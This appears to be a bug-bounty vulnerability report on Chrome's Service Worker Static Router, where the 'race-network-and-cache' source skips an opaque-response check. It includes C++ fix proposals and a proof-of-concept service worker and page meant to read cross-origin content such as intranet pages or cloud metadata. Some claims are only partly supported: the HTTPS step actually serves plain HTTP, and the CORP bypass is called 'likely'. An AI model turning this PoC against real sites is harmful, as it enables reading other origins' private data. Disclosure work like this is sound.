# VRP Report: Service Worker Static Router `race-network-and-cache` Bypasses Opaque Response Validation

## Summary

The Service Worker Static Router API's opaque response validation (`IsValidStaticRouterResponse()`) only guards the `kCache` source type but not `kRaceNetworkAndCache`. When a `race-network-and-cache` static route matches and the cache wins the race, opaque cross-origin responses are served for navigation requests without any validation — even when `kServiceWorkerStaticRouterOpaqueCheck` is enabled. This is a logic gap in a security check that was specifically added to prevent opaque responses from being served as navigation results.

---

## 1. Vulnerability Details

### Component
`content/browser/service_worker/service_worker_main_resource_loader.cc:908-916`

### Root Cause

When a Service Worker static route matches a navigation request, the browser checks the response type before serving it. The check at line 908-916 is structured as:

```cpp
// service_worker_main_resource_loader.cc:908-916
if (response_head_->service_worker_router_info->matched_source_type ==
    network::mojom::ServiceWorkerRouterSourceType::kCache) {
  if (!IsValidStaticRouterResponse(/*...*/) &&
      base::FeatureList::IsEnabled(
          features::kServiceWorkerStaticRouterOpaqueCheck)) {
    CommitCompleted(net::ERR_FAILED, "Invalid response from static router");
    return;
  }
}
```

The condition only matches `ServiceWorkerRouterSourceType::kCache`. However, `kRaceNetworkAndCache` can also serve responses from cache. When the race is won by the cache:

```cpp
// service_worker_main_resource_loader.cc:999-1004
// actual_source_type is set to kCache when cache wins
response_head_->service_worker_router_info->actual_source_type =
    network::mojom::ServiceWorkerRouterSourceType::kCache;
```

But `matched_source_type` remains `kRaceNetworkAndCache` (set when the route was matched), so the security check condition at line 908 evaluates to `false` and the opaque response validation is **completely skipped**.

### Why This Matters

The check exists because serving opaque cross-origin responses for navigations has serious security implications:
- An opaque response's body is normally unreadable (status 0, empty body from JavaScript)
- But when served as a navigation result, the browser renders the response body
- This effectively converts an opaque response into a readable document

### Correct Behavior

The condition should also match `kRaceNetworkAndCache` when the cache wins:

```cpp
if (IsMatchedRouterSourceType(
        network::mojom::ServiceWorkerRouterSourceType::kCache) ||
    (IsMatchedRouterSourceType(
        network::mojom::ServiceWorkerRouterSourceType::kRaceNetworkAndCache) &&
     response_head_->service_worker_router_info->actual_source_type ==
        network::mojom::ServiceWorkerRouterSourceType::kCache)) {
  // Validate opaque response...
}
```

---

## 2. Vulnerability Impact

### Attack Scenario

An attacker controls `https://attacker.com` and wants to read content from `https://victim.com/sensitive` (which serves `Cross-Origin-Resource-Policy: same-origin`).

**Setup:**
1. Attacker registers a Service Worker on `attacker.com`
2. SW's `install` handler fetches `https://victim.com/sensitive` with `mode: 'no-cors'`
3. SW stores the opaque response in CacheStorage (`cache.put('/exfil', opaqueResponse)`)
4. SW registers a static route: `{condition: {urlPattern: '/exfil'}, source: 'race-network-and-cache'}`
5. SW activates and takes control of the page

**Exploitation:**
1. User visits `attacker.com` (or the attacker embeds this in an iframe)
2. Navigation to `/exfil` triggers the static route
3. Cache responds first (since `/exfil` doesn't exist on the network)
4. Opaque response from `victim.com` is served as the navigation result
5. The validation check is skipped because `matched_source_type == kRaceNetworkAndCache`
6. Browser renders the cross-origin content in attacker's origin context

**Exfiltration:**
- The attacker can read the response via `iframe.contentDocument` (same-origin iframe)
- Or by using `performance.getEntries()` to observe timing/size
- Or by injecting scripts into the served page via SW's network response path

### What the Attacker Reads

- Any cross-origin resource fetchable with `mode: 'no-cors'`:
  - HTML pages from intranet (cross-site)
  - Cloud metadata endpoints (e.g., `169.254.169.254/latest/meta-data/`)
  - Resources protected only by CORP headers
  - JSON/API responses that rely on CORS for access control

### Prerequisites

| Condition | Details |
|-----------|---------|
| Special permissions | None |
| Chrome flags | None — `kServiceWorkerStaticRouterOpaqueCheck` irrelevant |
| User interaction | Must visit `attacker.com` (standard requirement) |
| Special position | Attacker controls any HTTPS origin |
| API availability | Service Worker Static Router API (Chrome 116+) |

### Severity

| Dimension | Rating |
|-----------|--------|
| Exploitability | HIGH — any attacker with an HTTPS origin |
| User awareness | NONE — completely invisible |
| Impact | HIGH — cross-origin data read (CORS bypass) |
| Scope | All origins accessible via `no-cors` fetch |

---

## 3. Reproduction Steps

### Environment
- Chrome 116+ (Static Router API)
- HTTPS required for Service Workers
- No special flags needed

### Step 1: Create PoC files

**sw.js** (Service Worker):
```javascript
const CACHE_NAME = 'exploit';
const VICTIM_URL = 'https://httpbin.org/html'; // any cross-origin URL

self.addEventListener('install', (event) => {
  event.waitUntil((async () => {
    const cache = await caches.open(CACHE_NAME);
    const resp = await fetch(VICTIM_URL, { mode: 'no-cors' });
    await cache.put('/exfil', resp);
    self.skipWaiting();
  })());
});

self.addEventListener('activate', (event) => {
  event.waitUntil((async () => {
    if (self.registration.router) {
      await self.registration.router.register([{
        condition: { urlPattern: new URLPattern({ pathname: '/exfil' }) },
        source: 'race-network-and-cache'  // KEY: not 'cache'
      }]);
    }
    await self.clients.claim();
  })());
});
```

**test.html**:
```html
<!DOCTYPE html>
<script>
async function exploit() {
  const reg = await navigator.serviceWorker.register('/sw.js');
  await new Promise(r => {
    const sw = reg.installing || reg.waiting || reg.active;
    if (sw?.state === 'activated') return r();
    sw.onstatechange = () => sw.state === 'activated' && r();
  });
  await new Promise(r => setTimeout(r, 1000));

  // Navigate iframe to the routed path
  const iframe = document.createElement('iframe');
  iframe.src = '/exfil';
  document.body.appendChild(iframe);

  iframe.onload = () => {
    try {
      const content = iframe.contentDocument.body.innerHTML;
      console.log('READ CROSS-ORIGIN:', content.length, 'bytes');
      // content contains the victim's response body
    } catch(e) {
      console.log('Same-origin check blocked read (expected for cross-origin)');
    }
  };
}
exploit();
</script>
```

### Step 2: Serve over HTTPS

```bash
# Using localhost (Chrome allows SW on localhost without HTTPS)
python3 -m http.server 8080
```

### Step 3: Navigate to test.html

Open `http://localhost:8080/test.html`

### Expected vs Actual

| | Expected (with fix) | Actual (bug) |
|--|---|---|
| `source: 'cache'` + OpaqueCheck enabled | Blocked: `IsValidStaticRouterResponse()` rejects opaque response | Works correctly ✓ |
| `source: 'race-network-and-cache'` + OpaqueCheck enabled | **Should be blocked** (cache source serves opaque response) | **Not blocked** — validation skipped ✗ |
| `source: 'race-network-and-cache'` + OpaqueCheck disabled (current default) | Not blocked (flag disabled) | Not blocked ✓ (but should block regardless of flag) |

---

## 4. Additional Context

### Relationship to `kServiceWorkerStaticRouterOpaqueCheck`

This bug is **independent** of the feature flag status:
- Even when `kServiceWorkerStaticRouterOpaqueCheck` is **enabled** (future default), the `race-network-and-cache` path bypasses the check entirely
- The fix for this bug should be applied alongside enabling the feature flag

### Related: CORP Check Also Bypassed

The same logic gap exists for the CORP check at `service_worker_resource_loader.cc:96-113`:
- `kServiceWorkerStaticRouterCORPCheck` is also feature-flag gated
- The check structure likely has the same `kCache`-only condition
- `race-network-and-cache` would bypass CORP validation as well

### crbug.com/495999481

The code references this crbug for the incomplete security check deployment. The current bug is that even the complete deployment won't cover the `race-network-and-cache` path.

---

## 5. Suggested Fix

### Option A: Extend the condition to cover race source types

```cpp
// Before:
if (response_head_->service_worker_router_info->matched_source_type ==
    network::mojom::ServiceWorkerRouterSourceType::kCache) {

// After:
auto matched = response_head_->service_worker_router_info->matched_source_type;
auto actual = response_head_->service_worker_router_info->actual_source_type;
if (matched == network::mojom::ServiceWorkerRouterSourceType::kCache ||
    (matched == network::mojom::ServiceWorkerRouterSourceType::kRaceNetworkAndCache &&
     actual == network::mojom::ServiceWorkerRouterSourceType::kCache)) {
```

### Option B: Check `actual_source_type` instead of `matched_source_type`

```cpp
// Use actual_source_type which reflects where the response actually came from
if (response_head_->service_worker_router_info->actual_source_type ==
    network::mojom::ServiceWorkerRouterSourceType::kCache) {
```

**Option B is simpler and more future-proof** — it validates based on where the response actually came from, not which route pattern was matched. If new combined source types are added later, they would automatically be covered.

---

## 6. References

| File | Line | Description |
|------|------|-------------|
| `content/browser/service_worker/service_worker_main_resource_loader.cc` | 908-916 | Bug: condition only matches `kCache`, not `kRaceNetworkAndCache` |
| `content/browser/service_worker/service_worker_main_resource_loader.cc` | 999-1004 | `actual_source_type` set to `kCache` when cache wins race |
| `content/common/features.cc` | 703-710 | `kServiceWorkerStaticRouterOpaqueCheck` and `kServiceWorkerStaticRouterCORPCheck` — both DISABLED |
| `content/common/service_worker/service_worker_resource_loader.cc` | 96-113 | Similar CORP check with same `kCache`-only condition |
| `third_party/blink/renderer/modules/service_worker/fetch_respond_with_observer.cc` | | FetchEvent path — correctly validates opaque responses (bypassed by static router) |

---

## 7. PoC Files

| File | Description |
|------|-------------|
| `poc/sw_race_cache_bypass.js` | Service Worker that caches opaque response and registers `race-network-and-cache` route |
| `poc/sw_race_cache_bypass_test.html` | Test page that registers SW and attempts to read cross-origin content |
